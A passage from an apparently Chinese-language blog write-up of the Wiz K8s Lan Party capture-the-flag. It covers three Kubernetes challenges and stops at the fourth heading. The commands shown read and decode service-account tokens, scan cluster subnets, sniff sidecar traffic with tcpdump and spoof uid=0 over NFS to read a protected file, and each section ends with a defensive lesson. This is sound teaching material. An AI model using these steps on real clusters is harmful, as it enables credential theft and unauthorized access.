<!doctype html><html lang=en-us><head><meta charset=utf-8><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><meta name=viewport content="width=device-width,initial-scale=1"><title>K8s Lan Party - en1r0py18655555 Blog</title>
<meta property="og:url" content="/posts/k8s-lan-party/"><meta property="og:site_name" content="en1r0py18655555 Blog"><meta property="og:title" content="K8s Lan Party"><meta property="og:description" content="Wiz K8s Lan Party Challenge 1: RECON 题目 As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have “loaded your machine with dnscan to ease this process for further challenges.
提示 在 Kubernetes 集群中进行侦查时，可以使用多种方法来收集信息和发现资源。以下是从DNS scanning中整理的几种主要侦查方式及其说明和使用场景：
环境变量检查 说明 环境变量通常包含集群中其他服务的 IP 地址和端口，特别是包含字符串 KUBERNETES 的变量，指向 Kubernetes API 服务。 使用场景 初步收集集群内服务的 IP 地址和端口。 获取 Kubernetes API 服务器的地址。 示例 $ env | grep KUBERNETES 文件系统检查 说明 检查 /etc/hosts 和 /etc/resolv."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-03T22:33:34+08:00"><meta property="article:modified_time" content="2024-09-03T22:33:34+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="K8s Lan Party"><meta name=twitter:description content="Wiz K8s Lan Party Challenge 1: RECON 题目 As a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have “loaded your machine with dnscan to ease this process for further challenges.
提示 在 Kubernetes 集群中进行侦查时，可以使用多种方法来收集信息和发现资源。以下是从DNS scanning中整理的几种主要侦查方式及其说明和使用场景：
环境变量检查 说明 环境变量通常包含集群中其他服务的 IP 地址和端口，特别是包含字符串 KUBERNETES 的变量，指向 Kubernetes API 服务。 使用场景 初步收集集群内服务的 IP 地址和端口。 获取 Kubernetes API 服务器的地址。 示例 $ env | grep KUBERNETES 文件系统检查 说明 检查 /etc/hosts 和 /etc/resolv."><link rel=stylesheet href=/style.min.d21d7ec2a4c5fdd1949f0c9ae34f92464a631f1e3f810acc268d854c8a7153dc798b0871ffbd2939035e2635fb78392227dcd96345321daffcbe0b3bffb9f612.css integrity="sha512-0h1+wqTF/dGUnwya40+SRkpjHx4/gQrMJo2FTIpxU9x5iwhx/70pOQNeJjX7eDkiJ9zZY0UyHa/8vgs7/7n2Eg=="><script>"theme"in localStorage||(localStorage.theme="light"),localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.setAttribute("data-theme","dark"):document.documentElement.setAttribute("data-theme","light")</script><script defer src=/js/header.64a5d751579791aca02cca13ec10c056a8bb0de07cc69a70f0ef401bb0f470f2360e07f1f6f4398e0681f9abd2c64b3cb9d167ee471fa2a07bb1943e06e0c02b.js integrity="sha512-ZKXXUVeXkaygLMoT7BDAVqi7DeB8xppw8O9AG7D0cPI2Dgfx9vQ5jgaB+avSxks8udFn7kcfoqB7sZQ+BuDAKw=="></script><script defer src=/js/zooming.684b5d075bf94d0adfa21a7e7eb9acec1ddfb2e7b47d6657981617f0db0cf50949f1172801595afa3051f51b28d67f6a2d0c41be677b59b564307d9dbe4a4fd2.js integrity="sha512-aEtdB1v5TQrfohp+frms7B3fsue0fWZXmBYX8NsM9QlJ8RcoAVla+jBR9Rso1n9qLQxBvmd7WbVkMH2dvkpP0g=="></script><script defer src=/js/builtin-copy.56e07a74dd440b068ab36af35542ed8960865686c19fb809f38436877ac081570612cc8a913650b0c0e3073a336680c5df960e73bf7b1de83dc6aa996f2db858.js integrity="sha512-VuB6dN1ECwaKs2rzVULtiWCGVobBn7gJ84Q2h3rAgVcGEsyKkTZQsMDjBzozZoDF35YOc797Heg9xqqZby24WA=="></script></head><body><header><div id=header_left><div id=sidebar_btn><input type=checkbox id=sidebar_btn_input class=hidden>
<label id=sidebar_btn_label for=sidebar_btn_input><svg id="menu_icon" width="26" height="26" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
</svg>
</label><label id=sidebar_canvas_overlay_wrapper for=sidebar_btn_input><div id=sidebar_canvas_overlay></div></label><div id=sidebar><ul></ul></div></div><div class=brand><div><a href=/>en1r0py18655555 Blog</a></div></div></div><div class=toolbox><div id=theme_tool><svg id="dark_mode_btn" class="toolbox-btn" width="18" height="18" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></svg><svg id="light_mode_btn" class="toolbox-btn" width="18" height="18" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></svg></div></div></header><nav id=navbar class=pure-menu><ul class=pure-menu-list></ul></nav><main><div id=content class=content-margin><div class=collapsible-menu-wrapper><div class=collapsible-menu-type><span>Table of contents</span></div><div class=collapsible-menu><nav id=TableOfContents><ul><li><a href=#challenge-1-recon>Challenge 1: RECON</a><ul><li><a href=#题目>题目</a></li><li><a href=#提示>提示</a></li><li><a href=#解题>解题</a></li><li><a href=#思考>思考</a></li></ul></li><li><a href=#challenge-2-finding-neighbours>Challenge 2: FINDING NEIGHBOURS</a><ul><li><a href=#题目-1>题目</a></li><li><a href=#解题-1>解题</a></li><li><a href=#思考-1>思考</a></li></ul></li><li><a href=#challenge-3-data-leakage>Challenge 3: DATA LEAKAGE</a><ul><li><a href=#题目-2>题目</a></li><li><a href=#解题-2>解题</a></li><li><a href=#思考-2>思考</a></li></ul></li><li><a href=#challenge-4-bypassing-boundaries>Challenge 4: BYPASSING BOUNDARIES</a><ul><li><a href=#题目-3>题目</a></li><li><a href=#解题-3>解题</a></li><li><a href=#思考-3>思考</a></li></ul></li><li><a href=#challenge-5-lateral-movement>Challenge 5: LATERAL MOVEMENT</a><ul><li><a href=#题目-4>题目</a></li><li><a href=#解题-4>解题</a></li><li><a href=#思考-4>思考</a></li></ul></li></ul></nav></div></div><div class=content-margin><article class=line-numbers><h1>Wiz K8s Lan Party</h1><h2>Challenge 1: RECON</h2><h3>题目</h3><p>As a warmup, utilize <a href=https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue>DNS scanning</a> to uncover hidden internal services and obtain the flag. We have &ldquo;loaded your machine with <a href=https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e>dnscan</a> to ease this process for further challenges.</p><h3>提示</h3><p>在 Kubernetes 集群中进行侦查时，可以使用多种方法来收集信息和发现资源。以下是从<a href=https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue>DNS scanning</a>中整理的几种主要侦查方式及其说明和使用场景：</p><ol><li>环境变量检查</li></ol><ul><li>说明<ul><li>环境变量通常包含集群中其他服务的 IP 地址和端口，特别是包含字符串 KUBERNETES 的变量，指向 Kubernetes API 服务。</li></ul></li><li>使用场景<ul><li>初步收集集群内服务的 IP 地址和端口。</li><li>获取 Kubernetes API 服务器的地址。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env | grep KUBERNETES
</span></span></code></pre></div><ol start=2><li>文件系统检查</li></ol><ul><li>说明<ul><li>检查 /etc/hosts 和 /etc/resolv.conf 文件可以获取 pod 的本地 IP 地址、DNS 服务器地址和 DNS 搜索域，从而推断 pod 的命名空间。</li></ul></li><li>使用场景<ul><li>获取 pod 的本地 IP 地址和名称。</li><li>获取集群 DNS 服务器地址和推断命名空间。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /etc/hosts
</span></span><span style=display:flex><span>$ cat /etc/resolv.conf
</span></span></code></pre></div><ol start=3><li>服务账户令牌检查</li></ol><ul><li>说明<ul><li>检查 pod 的服务账户令牌文件 /var/run/secrets/kubernetes.io/serviceaccount/token，可以解码令牌以提取声明信息，包括 API 服务器地址、pod 名称和服务账户名称。</li></ul></li><li>使用场景<ul><li>获取 Kubernetes API 服务器的地址。</li><li>获取 pod 名称和服务账户名称。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d <span style=color:#e6db74>&#39;.&#39;</span> -f <span style=color:#ae81ff>2</span> | base64 -d
</span></span></code></pre></div><ol start=4><li>Kubernetes API 访问</li></ol><ul><li>说明<ul><li>使用 Kubernetes API 是获取集群中 pod 和服务详细信息的主要方式。可以使用<code>kubectl</code>工具或<code>curl</code>命令进行查询。</li></ul></li><li>使用场景<ul><li>获取集群中所有 pod 和服务的详细信息。</li><li>检查服务账户令牌的权限。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> get pods -o wide
</span></span><span style=display:flex><span>$ curl -H <span style=color:#e6db74>&#34;Authorization: Bearer </span><span style=color:#66d9ef>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt https://10.100.0.1/api/v1/namespaces/k8s-lan-party/pods
</span></span></code></pre></div><ol start=5><li>传统的主机和端口发现</li></ol><ul><li>说明<ul><li>如果无法使用 Kubernetes API，可以使用传统的网络扫描技术来发现主机和服务。可以使用<code>ping</code>命令检查主机是否在线，使用<code>nmap</code>进行端口扫描。</li></ul></li><li>使用场景<ul><li>在无法访问 Kubernetes API 时，发现集群中的主机和服务。</li><li>识别集群中活动的 IP 地址和开放端口。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ping 10.96.0.1
</span></span><span style=display:flex><span>$ nmap -oG dns_scan_svc_1 -sn -Pn -R 10.96.0.0/16
</span></span></code></pre></div><ol start=6><li>Kubernetes DNS 服务</li></ol><ul><li>说明<ul><li>Kubernetes DNS 服务自动为集群中的 pod 和服务创建 DNS 记录，可以通过反向 DNS 查找来识别活动的服务和 pod。</li></ul></li><li>使用场景<ul><li>识别集群中与服务关联的 IP 地址。</li><li>通过反向 DNS 查找缩小潜在的 IP 范围。</li></ul></li><li>示例</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dig +short -x 10.96.0.10
</span></span><span style=display:flex><span>dig +short SRV _https._tcp.kubernetes.default.svc.cluster.local
</span></span></code></pre></div><h3>解题</h3><ol><li>此题通过env命令可以获得相关信息</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_PORT_HTTPS<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>USER_ID<span style=color:#f92672>=</span>061d21d7-c07c-49b7-a0cd-957a4f25d8c3
</span></span><span style=display:flex><span>HISTSIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span>PWD<span style=color:#f92672>=</span>/home/player
</span></span><span style=display:flex><span>HOME<span style=color:#f92672>=</span>/home/player
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP<span style=color:#f92672>=</span>tcp://10.100.0.1:443
</span></span><span style=display:flex><span>HISTFILE<span style=color:#f92672>=</span>/home/player/.bash_history
</span></span><span style=display:flex><span>TMPDIR<span style=color:#f92672>=</span>/tmp
</span></span><span style=display:flex><span>TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>SHLVL<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_PROTO<span style=color:#f92672>=</span>tcp
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_ADDR<span style=color:#f92672>=</span>10.100.0.1
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_HOST<span style=color:#f92672>=</span>10.100.0.1
</span></span><span style=display:flex><span>KUBERNETES_PORT<span style=color:#f92672>=</span>tcp://10.100.0.1:443
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>HISTFILESIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span>_<span style=color:#f92672>=</span>/usr/bin/env
</span></span></code></pre></div><ol start=2><li>通过题目中提供的<a href=https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e>dnscan</a>扫描k8s service 或使用nmap对k8s api service 的网段进行扫描</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -sn -Pn -R 10.100.0.1/16 | grep svc
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> getflag-service.k8s-lan-party.svc.cluster.local <span style=color:#f92672>(</span>10.100.136.254<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ dnscan -subnet 10.100.0.1/16
</span></span><span style=display:flex><span>10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.
</span></span></code></pre></div><ol start=3><li>通过访问getflag-service.k8s-lan-party.svc.cluster.local 即可获得flag</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl getflag-service.k8s-lan-party.svc.cluster.local
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>between-thousands-of-ips-you-found-your-northen-star<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考 class=header-anchor-wrapper>思考
<a href=#%e6%80%9d%e8%80%83 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>需避免在上述地方存储敏感数据，若必须存储，则需要进行监控。</p><h2 id=challenge-2-finding-neighbours class=header-anchor-wrapper>Challenge 2: FINDING NEIGHBOURS
<a href=#challenge-2-finding-neighbours class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h2><h3 id=题目-1 class=header-anchor-wrapper>题目
<a href=#%e9%a2%98%e7%9b%ae-1 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a href=https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/>sidecars</a> reporting sensitive secrets.</p><h3 id=解题-1 class=header-anchor-wrapper>解题
<a href=#%e8%a7%a3%e9%a2%98-1 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>根据<a href=https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/>sidecars</a>的内容，可以得知Sidecar容器与主容器共同使用存储与网络namespace。
尝试使用<code>tcpdump</code>进行网络监听</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ tcpdump -X
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>16:00:16.078369 IP 192.168.23.43.44200 &gt; reporting-service.k8s-lan-party.svc.cluster.local.http: Flags <span style=color:#f92672>[</span>P.<span style=color:#f92672>]</span>, seq 1:215, ack 1, win 502, options <span style=color:#f92672>[</span>nop,nop,TS val <span style=color:#ae81ff>1652472708</span> ecr 992109221<span style=color:#f92672>]</span>, length 214: HTTP: POST / HTTP/1.1
</span></span><span style=display:flex><span>        0x0000:  <span style=color:#ae81ff>4500</span> 010a 2f8a <span style=color:#ae81ff>4000</span> 7f06 3db1 c0a8 172b  E.../.@...<span style=color:#f92672>=</span>....+
</span></span><span style=display:flex><span>        0x0010:  0a64 ab7b aca8 <span style=color:#ae81ff>0050</span> 9d66 d16f f677 63b0  .d.<span style=color:#f92672>{</span>...P.f.o.wc.
</span></span><span style=display:flex><span>        0x0020:  <span style=color:#ae81ff>8018</span> 01f6 8eaf <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0101</span> 080a 627e bb84  ............b~..
</span></span><span style=display:flex><span>        0x0030:  3b22 62a5 504f <span style=color:#ae81ff>5354</span> 202f <span style=color:#ae81ff>2048</span> <span style=color:#ae81ff>5454</span> 502f  ;<span style=color:#e6db74>&#34;b.POST./.HTTP/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f37  er-Agent:.curl/7
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0070:  2e36 342e 300d 0a41 6363 6570 743a 202a  .64.0..Accept:.*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
</span></span></span></code></pre></div><h3 id=思考-1 class=header-anchor-wrapper>思考
<a href=#%e6%80%9d%e8%80%83-1 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>在容器内部尽量避免非必要的工具，例如tcpdump。</p><h2 id=challenge-3-data-leakage class=header-anchor-wrapper>Challenge 3: DATA LEAKAGE
<a href=#challenge-3-data-leakage class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h2><h3 id=题目-2 class=header-anchor-wrapper>题目
<a href=#%e9%a2%98%e7%9b%ae-2 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.</p><h3 id=解题-2 class=header-anchor-wrapper>解题
<a href=#%e8%a7%a3%e9%a2%98-2 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><ol><li>查看中全部挂载的文件系统。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ df -h
</span></span><span style=display:flex><span>Filesystem                                          Size  Used Avail Use% Mounted on
</span></span><span style=display:flex><span>overlay                                             300G  8.4G  292G   3% /
</span></span><span style=display:flex><span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/  8.0E     <span style=color:#ae81ff>0</span>  8.0E   0% /efs
</span></span><span style=display:flex><span>tmpfs                                                60G   12K   60G   1% /var/run/secrets/kubernetes.io/serviceaccount
</span></span><span style=display:flex><span>tmpfs                                                64M     <span style=color:#ae81ff>0</span>   64M   0% /dev/null
</span></span></code></pre></div><ol start=2><li>查看包含重要信息的挂载文件系统的详细信息。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ mount |grep /efs
</span></span><span style=display:flex><span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 <span style=color:#f92672>(</span>ro,relatime,vers<span style=color:#f92672>=</span>4.1,rsize<span style=color:#f92672>=</span>1048576,wsize<span style=color:#f92672>=</span>1048576,namlen<span style=color:#f92672>=</span>255,hard,noresvport,proto<span style=color:#f92672>=</span>tcp,timeo<span style=color:#f92672>=</span>600,retrans<span style=color:#f92672>=</span>2,sec<span style=color:#f92672>=</span>sys,clientaddr<span style=color:#f92672>=</span>192.168.57.108,local_lock<span style=color:#f92672>=</span>none,addr<span style=color:#f92672>=</span>192.168.124.98<span style=color:#f92672>)</span>
</span></span></code></pre></div><ol start=3><li>上述结果显示其 NFSv4 文件系统被挂载在 <code>/efs</code> 目录上，并且以只读模式进行访问。
首先使用 <code>nfs-ls</code> 查看内容。根据<a href=https://github.com/sahlberg/libnfs>libnfs 文档</a>，此工具默认使用 NFSv3，可以使用 URL 参数 <code>version=4</code> 来选择 NFSv4。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>----------  <span style=color:#ae81ff>1</span>     <span style=color:#ae81ff>1</span>     <span style=color:#ae81ff>1</span>           <span style=color:#ae81ff>73</span> flag.txt
</span></span></code></pre></div><ol start=4><li>直接使用<code>nfs-cat</code>提取文件内容，会获得权限不足错误</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>Failed to open file /flag.txt: open call failed with <span style=color:#e6db74>&#34;NFS4: (path /) failed with NFS4ERR_ACCESS(-13)&#34;</span>
</span></span><span style=display:flex><span>Failed to open nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span></code></pre></div><ol start=5><li>根据<a href=https://github.com/sahlberg/libnfs>libnfs 文档</a>，可以通过参数伪造uid。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-cat <span style=color:#e6db74>&#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&#34;</span>
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>old-school-network-file-shares-infiltrated-the-cloud!<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-2 class=header-anchor-wrapper>思考
<a href=#%e6%80%9d%e8%80%83-2 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>避免不安全的NFS配置。</p><h2 id=challenge-4-bypassing-boundaries class=header-anchor-wrapper>Challenge 4: BYPASSING BOUNDARIES
<a href=#challenge-4-bypassing-boundaries class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h2><h3 id=题目-3 class=header-anchor-wrapper>题目
